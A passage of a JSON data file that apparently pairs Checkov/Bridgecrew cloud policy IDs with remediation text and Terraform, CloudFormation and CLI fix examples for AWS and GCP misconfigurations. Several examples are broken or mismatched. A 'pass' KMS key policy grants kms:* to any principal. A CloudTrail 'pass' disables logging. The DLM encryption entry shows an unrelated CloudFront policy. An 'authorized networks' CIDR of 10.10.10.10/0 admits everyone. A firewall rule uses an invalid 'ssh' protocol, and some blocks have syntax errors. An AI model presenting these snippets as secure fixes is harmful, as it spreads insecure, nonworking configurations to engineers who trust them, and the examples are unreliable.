        "description": "AWS CloudTrail does not define an SNS Topic\nDescription\nAWS CloudTrail is a service that records API activity in your AWS account, including all API calls made to AWS services and the associated responses. By sending CloudTrail log events to an SNS topic, you can set up notifications that will be sent to you whenever certain types of activity occur in your AWS environment.\nIn addition, sending CloudTrail log events to an SNS topic also allows you to store the log events in a central location, such as an Amazon S3 bucket, for analysis and reporting purposes. This can be useful for compliance, auditing, and other types of monitoring.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_cloudtrail\" \"pass\" {\n  name                          = \"TRAIL\"\n  s3_bucket_name                = aws_s3_bucket.test.id\n  include_global_service_events = true\n  enable_logging                = false\n  is_multi_region_trail         = false\n  sns_topic_name                = aws_sns_topic.notes.arn\n  tags                          = { test = \"Fail\" }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_234": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-acm-certificates-has-logging-preference",
        "description": "AWS ACM certificate does not have logging preference\nDescription\nTo guard against SSL/TLS certificates that are issued by mistake or by a compromised CA, some browsers like Chrome require that public certificates issued for a domain be recorded in a certificate transparency log. The domain name is recorded, but not the private key. Certificates that are not logged typically generate an error in the browser.\nFix - Runtime\nConsole\nIt is not possible to adjust transparency logging via console.\nCLI\nShellaws acm request-certificate \\\n--domain-name example.com \\\n--validation-method DNS \\\n--options CertificateTransparencyLoggingPreference=ENABLED \\\n\nFix - Buildtime\nCloudFormation\nYAMLResources: \n  Example: \n    Type: \"AWS::CertificateManager::Certificate\"\n    Properties: \n      DomainName: example.com\n      ValidationMethod: DNS\n+     CertificateTransparencyLoggingPreference: ENABLED\n\nTerraform\nGoresource \"aws_acm_certificate\" \"example\" {\n  domain_name       = \"example.com\"\n  validation_method = \"DNS\"\n\n+ options {\n+   certificate_transparency_logging_preference = \"ENABLED\"\n+ }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_277": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-security-group-does-not-allow-all-traffic-on-all-ports",
        "description": "AWS Security Group allows all traffic on all ports\nDescription\nBy allowing all ingress traffic on all ports, AWS security group permits unrestricted internet access. Make sure that ports are defined properly\nFix - Buildtime\nTerraform\nGoresource \"aws_security_group\" \"example\" {\n  name = \"allow-all-ingress\"\n\n  ingress {\n    cidr_blocks = [\"0.0.0.0/0\"]\n-    from_port   = -1\n-    to_port     = -1\n+    from_port   = 443\n+    to_port     = 443\n    protocol    = \"tcp\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_34": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-ssm-parameter-is-encrypted",
        "description": "AWS SSM Parameter is not encrypted\nDescription\nAs a best practice enable encryption for your AWS SSM Parameter to improve data security without making changes to your business or applications.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_ssm_parameter\" \"aws_ssm_parameter_ok\" {\n name            = \"sample\"\n type            = \"SecureString\"\n value           = \"test\"\n description     = \"policy test\"\n tier            = \"Standard\"\n allowed_pattern = \".*\"\n data_type       = \"text\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_255": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-schedules-are-encrypted",
        "description": "AWS DLM-cross region schedules are not encrypted\nDescription\nAs a best practice enable encryption for your AWS DLM-cross region schedules to improve data security without making changes to your business or applications. \nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_cloudfront_response_headers_policy\" \"pass\" {\n  name    = \"test\"\n\n  security_headers_config {\n    strict_transport_security {\n      access_control_max_age_sec = 31536000\n      include_subdomains         = true\n      override                   = true\n      preload                    = true\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_227": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-key-management-service-kms-key-is-enabled",
        "description": "AWS Key Management Service (KMS) key is disabled\nDescription\nEnsuring that your Amazon Key Management Service (AWS KMS) key is enabled is important because it determines whether the key can be used to perform cryptographic operations. When a key is enabled, it can be used to encrypt, decrypt, and generate data keys. When it is disabled, it cannot be used for these operations.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_kms_key\" \"pass\" {\n  description = \"description\"\n  is_enabled  = true\n  policy      = <<POLICY\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::111122223333:root\"\n      },\n      \"Action\": \"kms:*\",\n      \"Resource\": \"*\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"Action\": \"kms:*\",\n      \"Resource\": \"*\"\n    },\n  ]\n}\nPOLICY\n  tags        = { test = \"Fail\" }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-all-nacl-are-attached-to-subnets",
        "description": "Not all NACL are attached to subnets\nDescription\nNetwork Access Control Lists (NACLs) are used to allow or deny traffic to and from subnets in a Virtual Private Cloud (VPC) in Amazon Web Services (AWS). It's important to ensure that all NACLs are attached to subnets because this allows you to set specific rules for controlling inbound and outbound traffic for those subnets. This can help to improve the security and connectivity of your VPC by allowing you to specify which traffic is allowed to enter or leave your subnets.\nFix - Buildtime \nTerraform\n\nResource: aws_vpc,  aws_network_acl, aws_subne\nArgument: subnet_ids of  aws_network_acl\n\nGoresource \"aws_vpc\" \"ok_vpc\" {\n  cidr_block = \"10.0.0.0/16\"\n}\n\nresource \"aws_subnet\" \"main\" {\n  vpc_id     = aws_vpc.ok_vpc.id\n  cidr_block = \"10.0.1.0/24\"\n}\n\nresource \"aws_subnet\" \"main\" {\n  cidr_block = \"10.0.1.0/24\"\n}\n\nresource \"aws_network_acl\" \"acl_ok\" {\n  vpc_id = aws_vpc.ok_vpc.id\n  subnet_ids = [aws_subnet.main.id]\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_18": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-elastic-file-system-amazon-efs-file-systems-are-added-in-the-backup-plans-of-aws-backup",
        "description": "Amazon EFS does not have an AWS Backup backup plan\nDescription\nEnsure that Amazon Elastic File Systems (EFS) are included in your backup plans for the AWS Backup. AWS Backup is a fully managed backup service that helps you protect your data in the cloud by automatically backing up your data to a secure, durable storage location. By creating a backup plan, you can ensure that your data is regularly backed up and can be recovered in the event of data loss or corruption.\nFix - Buildtime \nTerraform\n\nResource: aws_backup_plan, aws_backup_selection, aws_efs_file_system\nArgument:  plan_id and resources of aws_backup_selection\n\nGoresource \"aws_backup_plan\" \"example\" {\n  name = \"tf_example_backup_plan\"\n\n  rule {\n    rule_name         = \"tf_example_backup_rule\"\n    target_vault_name = aws_backup_vault.test.name\n    schedule          = \"cron(0 12 * * ? *)\"\n  }\n\n  advanced_backup_setting {\n    backup_options = {\n      WindowsVSS = \"enabled\"\n    }\n    resource_type = \"EC2\"\n  }\n}\n\nresource \"aws_backup_selection\" \"ok_backup\" {\n  iam_role_arn = aws_iam_role.example.arn\n  name         = \"tf_example_backup_selection\"\n  plan_id      = aws_backup_plan.example.id\n\n  resources = [\n    aws_db_instance.example.arn,\n    aws_ebs_volume.example.arn,\n    aws_efs_file_system.ok_efs.arn,\n  ]\n}\n\nresource \"aws_efs_file_system\" \"ok_efs\" {\n  creation_token = \"my-product\"\n\n  tags = {\n    Name = \"MyProduct\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_41": {
        "url": "https://docs.bridgecrew.io/docs/ensure-an-iam-role-is-attached-to-ec2-instance",
        "description": "AWS EC2 Instance IAM Role not enabled\nDescription\nAWS provides Identity Access Management (IAM) roles to securely access AWS services and resources. The role is an identity with permission policies that define what the identity can and cannot do in AWS. As a best practice, create IAM roles and attach the role to manage EC2 instance permissions securely instead of distributing or sharing keys or passwords\nFix - Buildtime\nTerraform\n\nResource: aws_instance\nArgument: iam_instance_profile\n\nYAMLresource \"aws_instance\" \"pass\" {\n  ami           = \"ami-005e54dee72cc1d00\" # us-west-2\n  instance_type = \"t2.micro\"\n  iam_instance_profile = \"test\"\n\n  network_interface {\n    network_interface_id = aws_network_interface.foo.id\n    device_index         = 0\n  }\n\n  credit_specification {\n    cpu_credits = \"unlimited\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_50": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-elasticache-redis-cluster-with-multi-az-automatic-failover-feature-set-to-enabled",
        "description": "AWS ElastiCache Redis cluster with Multi-AZ Automatic Failover feature set to disabled\nDescription\nThis policy identifies ElastiCache Redis clusters that have Multi-AZ Automatic Failover feature set to disabled. It is recommended to enable the Multi-AZ Automatic Failover feature for your Redis Cache cluster, which will improve primary node reachability by providing read replica in case of network connectivity loss or loss of availability in the primary's availability zone for read/write operations.\\nNote: Redis cluster Multi-AZ with automatic failover does not support T1 and T2 cache node types and is only available if the cluster has at least one read replica.\nFix - Buildtime\nTerraform\nGoresource \"aws_elasticache_replication_group\" \"pass\" {\n  automatic_failover_enabled  = true\n  preferred_cache_cluster_azs = [\"us-west-2a\", \"us-west-2b\"]\n  replication_group_id        = \"tf-rep-group-1\"\n  description                 = \"example description\"\n  node_type                   = \"cache.m4.large\"\n  num_cache_clusters          = 2\n  parameter_group_name        = \"default.redis3.2\"\n  port                        = 6379\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_19": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_11",
        "description": "GCP Kubernetes engine clusters have basic authentication enabled\nDescription\nGKE supports multiple secure authentication methods, including service account bearer tokens, OAuth tokens, x509 client certificates. Basic authentication and client certificate issuance are disabled by default for clusters created with GKE 1.12 and later. \nWe recommend you use Cloud IAM, or an alternative secure authentication mechanism, as the identity provider for GKE clusters.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"pass2\" {\n  name               = \"google_cluster\"\n  monitoring_service = \"monitoring.googleapis.com\"\n  master_authorized_networks_config {}\n  master_auth {\n    username = \"\"\n    password = \"\"\n    client_certificate_config {\n      issue_client_certificate = false\n    }\n  }\n\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_29": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_gcs_2",
        "description": "GCP cloud storage bucket with uniform bucket-level access are disabled\nDescription\nFor a user to access a Cloud Storage resource only one of the systems needs to grant the user permission. Cloud IAM is used throughout Google Cloud and allows you to grant a variety of permissions at bucket and project levels. ACLs have limited permission options, are used only by Cloud Storage, and allow you to grant permissions on a per-object basis.\nCloud Storage has uniform bucket-level access that supports a uniform permissioning system. Using this feature disables ACLs for all Cloud Storage resources. Access to Cloud Storage resources is granted exclusively through Cloud IAM. Enabling uniform bucket-level access guarantees that if a Storage bucket is not publicly accessible, no object in the bucket is publicly accessible.\nWe recommend you enable uniform bucket-level access on Cloud Storage buckets. Uniform bucket-level access is used to unify and simplify how you grant access to your Cloud Storage resources. Cloud Storage offers two systems that act in parallel for granting users permission to access your buckets and objects: \n\nCloud Identity and Access Management (Cloud IAM)\nAccess Control Lists (ACLs). \n\nFix - Runtime\nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud Storage.\nFrom the list of buckets, select the name of the desired bucket.\nNear the top of the page, click the Permissions tab.\nIn the text box that begins This bucket uses fine-grained access control, click Edit.\nA pop-up menu opens. Select Uniform.\nClick Save.\n\nCLI Command\nSet the option to on for uniformbucketlevelaccess, using the following command:\ngsutil uniformbucketlevelaccess set on gs://BUCKET_NAME/\nFix - Buildtime \nTerraform\n\nResource: google_storage_bucket\nArgument: uniform_bucket_level_access is set to true,\n\nGoresource \"google_storage_bucket\" \"examplea\" {\n    name     = \"terragoat-${var.environment}\"\n    bucket_policy_only = true\n +   uniform_bucket_level_access = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_GCP_11": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-gcr-container-vulnerability-scanning-is-enabled",
        "description": "GCP GCR Container Vulnerability Scanning is disabled\nDescription\nThis policy identifies GCP accounts where GCR Container Vulnerability Scanning is not enabled. GCR Container Analysis and other third party products allow images stored in GCR to be scanned for known vulnerabilities. Vulnerabilities in software packages can be exploited by hackers or malicious users to obtain unauthorized access to local cloud resources. It is recommended to enable vulnerability scanning for images stored in Google Container Registry.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_project_services\" \"pass_1\" {\n  project = \"your-project-id\"\n  services   = [\"iam.googleapis.com\", \"cloudresourcemanager.googleapis.com\", \"containerscanning.googleapis.com\"]\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_1": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_1",
        "description": "Stackdriver logging on Kubernetes engine clusters is disabled\nDescription\nStackdriver is the default logging solution for clusters deployed on GKE. Stackdriver logging is deployed to a new cluster by default, explicitly set to opt-out. Stackdriver logging collects only the container\u2019s standard output and standard error streams. To ingest logs, Stackdriver logging agent must be deployed to each node in the cluster. Stackdriver provides a single-pane-of-glass view of metrics, logs, and traces through Kubernetes Engine clusters and workloads. \nWe recommend you use Stackdriver logging as a unified data logging solution for GKE workloads unless additional observability tooling is already in place.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"primary\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  remove_default_node_pool = true\n  initial_node_count       = 1\n  logging_service = \"logging.googleapis.com/kubernetes\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_7": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_2",
        "description": "ABAC authorization on Kubernetes engine clusters is enabled\nDescription\nKubernetes RBAC (Role-Based Access Control) can be used to grant permissions to resources at the cluster and namespace level. It allows defining roles with rules containing a set of permissions. RBAC has significant security advantages and is now stable in Kubernetes, superseding  the benefits of legacy authorization with ABAC (Attribute-Based Access Control). \nWe recommend you disable ABAC authorization and use RBAC in GKE instead.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"primary\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  remove_default_node_pool = true\n  initial_node_count       = 1\n  logging_service = \"logging.googleapis.com/kubernetes\"\n  enable_legacy_abac = false\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_8": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_3",
        "description": "GCP Kubernetes Engine Clusters have Cloud Monitoring disabled\nDescription\nStackdriver is the default logging solution for clusters deployed on GKE. Stackdriver logging is deployed to a new cluster by default, explicitly set to opt-out. Stackdriver logging collects only the container\u2019s standard output and standard error streams. To ingest logs, Stackdriver logging agent must be deployed to each node in the cluster. Stackdriver provides a single-pane-of-glass view of metrics, logs, and traces through Kubernetes Engine clusters and workloads. \nWe recommend you use Stackdriver logging as a unified data logging solution for GKE workloads unless additional observability tooling is already in place.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"primary\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  remove_default_node_pool = true\n  initial_node_count       = 1\n  monitoring_service = \"monitoring.googleapis.com/kubernetes\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_9": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_4",
        "description": "GCP Kubernetes cluster node auto-repair configuration is disabled\nDescription\nAuto-repairing mode in GKE is an automated service that identifies and repairs a failing node to maintain a healthy running state. GKE makes periodic checks on the health state of each node in the cluster. If a node fails consecutive health checks over an extended time period, GKE initiates a repair process for that node.\nWe recommend automatic node repair is enabled on kubernetes clusters to provide continued operation of mission critical nodes and ensuring applications are operating based on their pre-defined specs, minimized downstream failures and redundant alerting and triage.\nFix - Runtime\nGcloud CLI\nUse the following command line to enable the node-pool automatic repair feature:\nBashgcloud container node-pools update pool-name \n--cluster cluster-name \\\n--zone compute-zone \\\n--enable-autorepair\n\nMore information here: https://cloud.google.com/kubernetes-engine/docs/how-to/node-auto-repai\nFix - Buildtime \nTerraform\nAdd the following code bloc into your google_container_node_pool resource:\n  management {\n    auto_repair  = true\n  }\n\nIf you don't have a separated node-pool resource on your terraform codebase, you can refer to the Gcloud CLI part. You will first need to recover the name of the node pool through the console or the CLI. Please be reminded that it is best practice to delete the default node-pool from the cluster and to create a specific one using the google_container_node_pool resource.\nMore information here: https://cloud.google.com/kubernetes-engine/docs/how-to/node-auto-repair",
        "severity": "MEDIUM"
    },
    "CKV_GCP_10": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_5",
        "description": "GCP Kubernetes cluster node auto-upgrade configuration is disabled\nDescription\nNode auto-upgrade keeps nodes up-to-date with the latest cluster master version when your master is updated on your behalf. When a new cluster or node pool is created, node auto-upgrade is enabled as default.\nWe recommend you ensure auto-upgrade is enabled. Automatic node upgrade ensures that when new binaries are released you instantly get a fix with the latest security issues resolved. GKE will automatically ensure that security updates are applied and kept up to date.\nFix - Buildtime\nTerraform\nGoresource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n  name       = \"my-node-pool\"\n  cluster    = google_container_cluster.primary.id\n  node_count = 1\n  management {\n    auto_upgrade = true\n  }\n    ]\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_25": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_6",
        "description": "Private cluster is disabled when creating Kubernetes clusters\nDescription\nPrivate clusters enable isolation of nodes from any inbound and outbound connectivity to the public internet. This is achieved as the nodes have internal RFC 1918 IP addresses only. In private clusters, the cluster master has private and public endpoints. You can configure which endpoint should be enabled or disabled to control access to the public internet.\nWe recommend you enable private cluster when creating Kubernetes clusters. By creating a private cluster, the nodes will have a reserved set of IP addresses, ensuring their workloads are isolated from the public internet.\nFix - Buildtime\nTerraform\nAdd Block: private_cluster_config with attribute  enable_private_nodes set to true.\ngoogle_container_cluster.cluster.tfresource \"google_container_cluster\" \"cluster\" {\n...\n+ private_cluster_config {\n+   enable_private_nodes=true\n+ }\n...\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_12": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_7",
        "description": "GCP Kubernetes engine clusters have network policy disabled\nDescription\nDefining a network policy helps ensure that a compromised front-end service in your application cannot communicate directly with an external interface, for example, a billing or an accounting service several levels down. Network policy rules can ensure that Pods and Services in a given namespace cannot access other Pods or Services in a different namespace.\nWe recommend you enable Network Policy on kubernetes engine clusters to determine which Pods and Services can access one another inside your cluster. This ensures only the required services are communicating and no explicitly indicated traffic is able to reach private clusters.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"pass\" {\n  name = \"google_cluster\"\n  network_policy {\n    enabled = true\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_13": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_8",
        "description": "GCP Kubernetes engine clusters have client certificate enabled\nDescription\nKubernetes uses client certificates, bearer tokens, an authenticating proxy, HTTP basic auth or OAuth app to authenticate API requests through authentication plugins. As HTTP requests are made to the API server, plugins attempt to associate the following attributes with the request.\nWe recommend you ensure Kubernetes engine clusters are authenticated using OAuth method and not using client certificates as before after service latest upgrade.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"primary\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  master_auth {\n    client_certificate_config {\n      issue_client_certificate = false\n    }\n  }\n  node_config {\n    # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n    service_account = google_service_account.default.email\n    oauth_scopes = [\n      \"https://www.googleapis.com/auth/cloud-platform\"\n    ]\n    labels = {\n      foo = \"bar\"\n    }\n    tags = [\"foo\", \"bar\"]\n  }\n  timeouts {\n    create = \"30m\"\n    update = \"40m\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_24": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_9",
        "description": "PodSecurityPolicy controller is not enabled on Kubernetes engine clusters\nDescription\nPodSecurityPolicy is an admission controller resource created to validate requests to create and update Pods on your cluster. The PodSecurityPolicy defines a set of conditions that Pods must meet to be accepted by the cluster. When a request to create or update a Pod does not meet the conditions in the PodSecurityPolicy, that request is rejected and an error is returned.\nWe recommend you enable PodSecurityPolicy Controller on Kubernetes engine clusters.\nFix - Runtime\nGcloud CLI\nTo update the cluster to enable the PodSecurityPolicy Controller, use this command:\ngcloud beta container clusters update cluster-name --enable-pod-security-policy\n\nMore information at: https://cloud.google.com/kubernetes-engine/docs/how-to/pod-security-policies\nFix - Buildtime\nTerraform\nFirst, be sure to have the google-beta provider setup in the google_container_cluster, then add the following block of code:\nGopod_security_policy_config {\n    enabled = true\n}\n\nMore information at: https://www.terraform.io/docs/providers/google/r/container_cluster.html#pod_security_policy_config",
        "severity": "LOW"
    },
    "CKV_GCP_18": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_10",
        "description": "GKE control plane is public\nDescription\nThe GKE cluster control plane and nodes have internet routable addresses that can be accessed from any IP address by default. Direct internet access to nodes can be disabled by specifying the gcloud tool option enable-private-nodes at cluster creation.\nWe recommend you disable direct internet access to nodes at cluster creation and ensure clusters use master authorized networks and private nodes to reach the control plane by whitelisted CIDRs, nodes within the cluster VPC and Google management jobs.\nWe also recommend you limit the exposure of the cluster control plane and nodes to the internet. These settings can only be set at cluster creation time and help ensure sensitive controllers are not exposed to external access.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"primary\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  private_cluster_config {\n        enable_private_nodes = true\n    }\n }\n",
        "severity": "LOW"
    },
    "CKV_GCP_20": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_12",
        "description": "Master authorized networks are not enabled in GKE clusters\nDescription\nAuthorized networks allow whitelisting of specific CIDR ranges and permit IP addresses in those ranges to access the cluster master endpoint using HTTPS. GKE uses both TLS and authentication to secure access to the cluster master endpoint from the public Internet. This approach enables the flexibility to administer the cluster from anywhere. \nWe recommend you enable master authorized networks in GKE clusters. Using authorized networks you will be able further restrict access to specified sets of IP addresses.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"primary\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  master_auth {\n    client_certificate_config {\n      issue_client_certificate = false\n    }\n  }\n  master_authorized_networks_config {\n    cidr_blocks {\n      cidr_block =\"10.10.10.10/0\"\n      display_name = \"foo\"\n    }\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_21": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_13",
        "description": "GCP Kubernetes engine clusters do not have any label information\nDescription\nLabels are key, value pairs that are attached to objects intended to be used to specify identifying attributes of objects that are meaningful and relevant to users, but do not directly imply semantics to the core system. \nLabels can be used to organize and select subsets of objects. Labels can be attached to objects at creation time and subsequently added and modified at any time. Each object can have a set of key/value labels defined. Each Key must be unique for a given object. Labels enable users to map their own organizational structures onto system objects in a loosely coupled fashion, without requiring clients to store these mappings.\nWe recommend you configure Kubernetes clusters with labels.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"primary\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  master_auth {\n    client_certificate_config {\n      issue_client_certificate = false\n    }\n  }\n  node_config {\n    # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n    service_account = google_service_account.default.email\n    oauth_scopes = [\n      \"https://www.googleapis.com/auth/cloud-platform\"\n    ]\n    labels = {\n      foo = \"bar\"\n    }\n    tags = [\"foo\", \"bar\"]\n  }\n  timeouts {\n    create = \"30m\"\n    update = \"40m\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_22": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_14",
        "description": "GCP Kubernetes engine clusters are not using Container-Optimized OS for node image\nDescription\nGKE enables users to select the operating system image that runs on each node. You can also upgrade an existing cluster to use a different node image type. GKE supports several OS images using the main container runtime directly integrated with Kubernetes, including cos_containerd and ubuntu_containerd. \nWe recommend you use cos_containerd and ubuntu_containerd to enhance node security. Containerd is an industry-standard container runtime component that regularly updates security fixes and patches, providing better support, security, and stability than other images. \nFix - Runtime\nGcloud CLI\nUse this following command to upgrade the cluster to use the COS image:\nBashgcloud container clusters upgrade --image-type cos cluster-name \n\nTo upgrade a specific node-pool add the flag/argument --node-pool node-pool-name.\nFix - Buildtime \nTerraform\nAdd the image_type argument into the node_config bloc to your google_container_cluster or google_container_node_pool resource:\nhcl\n    node_config {\n      image_type   = \"COS\"\n  }\n\nIt should force the cluster to recreate a node following the new configuration.\nFor further information please follow this link: https://www.terraform.io/docs/providers/google/r/container_cluster.html#image_type",
        "severity": "LOW"
    },
    "CKV_GCP_23": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_15",
        "description": "Kubernetes clusters are not created with alias IP ranges enabled\nDescription\nIn GKE, clusters can be set apart based on how they route traffic from one pod to another. A cluster that uses alias IP ranges is called a VPC-native cluster. A cluster that uses Google Cloud Routes is called a routes-based cluster. \nWe recommend you create Kubernetes clusters with alias IP ranges enabled. Alias IP ranges allow Pods to directly access hosted services without using a NAT gateway.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"primary\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  remove_default_node_pool = true\n  initial_node_count       = 1\n  ip_allocation_policy\n  {\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_2": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_1",
        "description": "GCP Firewall rule allows all traffic on SSH port 22\nDescription\nFirewall rules setup fine-grained allow/deny traffic policies to and from a VM. Enabled rules are always enforced, and help protect instances from unwanted traffic. Firewall rules are defined at the network level, and only apply to the network where they are created. \nEvery VPC functions as a distributed firewall. While firewall rules are defined at the network level, connections are allowed or denied on a per-instance basis. A default network is pre-populated with firewall rules that allow incoming traffic to instances. The default-allow-ssh rule permits ingress connections on TCP port 22 from any source to any instance in the network. \nWe recommend you restrict or remove the default-allow-ssh rule when you no longer need it.\nFix - Runtime \nProcedure\n\nList your firewall rules. You can view a list of all rules or just those in a particular network.\nClick the rule default-allow-ssh.\nClick Delete.\nClick Delete again to confirm.\n\nCLI Command\ngcloud compute firewall-rules delete default-allow-ssh\nFix - Buildtime\nTerraform\n\nResource: google_compute_firewall\nArgument: deny. The deny block supports:\nprotocol (Required)\nThe IP protocol to which this rule applies. The protocol type is required when creating a firewall rule. This value can either be one of the following well known protocol strings (tcp, udp, icmp, esp, ah, sctp, ipip), or the IP protocol number.\nports (Optional)\nAn optional list of ports to which this rule applies. This field is only applicable for UDP or TCP protocol. Each entry must be either an integer or a range. If not specified, this rule applies to connections through any port. Example inputs include: [\"22\"], [\"80\",\"443\"], and [\"12345-12349\"].\n\nGoresource \"google_compute_firewall\" \"default\" {\n  name    = \"test-firewall\"\n  network = google_compute_network.default.name\n\n  allow {\n    protocol = \"icmp\"\n  }\n\n  deny {\n    protocol = \"ssh\"\n    ports    = [\"22\"]\n  }\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_GCP_3": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_2",
        "description": "GCP Firewall rule allows all traffic on RDP port 3389\nDescription\nFirewall rules setup fine grained allow/deny traffic policies to and from a virtual machine (VM). Enabled rules are always enforced, and help protecting instances from unwanted traffic. Firewall rules are defined at the network level, and only apply to the network where they are created. \nEvery VPC functions as a distributed firewall. While firewall rules are defined at the network level, connections are allowed or denied on a per-instance basis. A default network is pre-populated with firewall rules that allow incoming traffic to instances. The default-allow-rdp rule permits ingress connections on TCP port 3389 from any source to any instance in the network. \nWe recommend you restrict or remove the default-allow-rdp rule when you no longer need it.\nFix - Runtime\nProcedure\n\nList your firewall rules. You can view a list of all rules or just those in a particular network.\nClick the rule \"default-allow-rdp\" to delete.\nClick Delete.\nClick Delete again to confirm.\n\nCLI Command\ngcloud compute firewall-rules delete default-allow-rdp\nFix - Buildtime \nTerraform\n\nResource: google_compute_firewall\nArgument: deny. The deny block supports:\nprotocol (Required) The IP protocol to which this rule applies. The protocol type is required when creating a firewall rule. This value can either be one of the following well known protocol strings (tcp, udp, icmp, esp, ah, sctp, ipip), or the IP protocol number.\nports (Optional) An optional list of ports to which this rule applies. This field is only applicable for UDP or TCP protocol. Each entry must be either an integer or a range. If not specified, this rule applies to connections through any port. Example inputs include: [\"22\"], [\"80\",\"443\"], and [\"12345-12349\"].\n\nGoresource \"google_compute_firewall\" \"default\" {\n  name    = \"test-firewall\"\n  network = google_compute_network.default.name\n\n  allow {\n    protocol = \"icmp\"\n  }\n\n  deny {\n    protocol = \"tcp\"\n    ports    = [\"3389\"]\n  }\n",
        "severity": "CRITICAL"
    },
    "CKV_GCP_4": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_networking_3",
